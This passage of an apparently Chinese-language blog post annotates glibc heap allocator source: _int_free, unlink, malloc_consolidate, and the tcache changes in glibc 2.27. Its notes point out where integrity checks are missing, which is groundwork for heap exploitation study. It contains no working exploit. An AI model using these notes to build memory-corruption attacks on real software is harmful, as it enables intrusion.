errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//进行了一系列的检测</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//清除p位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//      统一放入unsortedbin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//largebin清空nextsize链</span></span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;<span class="comment">//fd,bk链设置</span></span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);<span class="comment">//设置p位</span></span><br><span class="line">      set_foot(p, size);<span class="comment">//设置下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//nextchunk是topchunk的情况</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//收缩堆</span></span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li>伴随一系列的检查,<strong>从低地址到高地址</strong>判断是否可进行合并</li><li>合并后的chunk的size若大于FASTBIN_CONSOLIDATION_THRESHOLD<ol><li>如果有fast chunk则触发malloc_consolidate</li><li>如果top<em>size大于mp</em>.trim_threshold,尝试systrim收缩堆,否则尝试heap_trim收缩堆</li></ol></li></ol><h2 id="附属"><a href="#附属" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>脱链操作</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将fastbin中的chunk逐个取出遍历</p><ol><li>判断prev_chunk是否可合并</li><li>判断next_chunk是不是top_chunk<ol><li>若不是则判断next_chunk是否在使用,不在使用则合并,在使用则清空next_chunk的prev_inuse位</li><li>若是则直接并到top_chunk</li></ol></li></ol><p><strong>可以看到与正常从fastbin中取出相比其中几乎没有检查</strong></p><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>变化比较大的就是2.26的时候多了个tcache</p><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();                            <span class="comment">// 优先判断tcache是否初始化</span></span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>在_libc_malloc中添加了tcache操作,可以直接在_libc_malloc获得chunk返回</strong></p><p>并且多了SINGLE_THREAD_P的判断分支</p><h3 id="int-malloc-1"><a href="#int-malloc-1" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>fastbin取出发生较大变化</p><ol><li>之前的fastbin移除操作,现在分为两种情况<ul><li>如果是SINGLE_THREAD_P模式,直接*fb = victim-&gt;fd;最简单的单链表移除</li><li>之前的常规fastbin移除操作,现在采取REMOVE_FB宏来表示</li></ul></li><li>新增fastbin填充tcache机制,当从fastbin中取出chunk后,如果该fastbin中还有剩余chunk,且对应tcache中有剩余空间,则会将fastbin中的chunk移入tcachebin</li></ol><h4 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">-          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">-            malloc_consolidate (av);</span><br></pre></td></tr></table></figure><p><strong>去除</strong>bins未初始化则触发malloc_consolidate的机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span 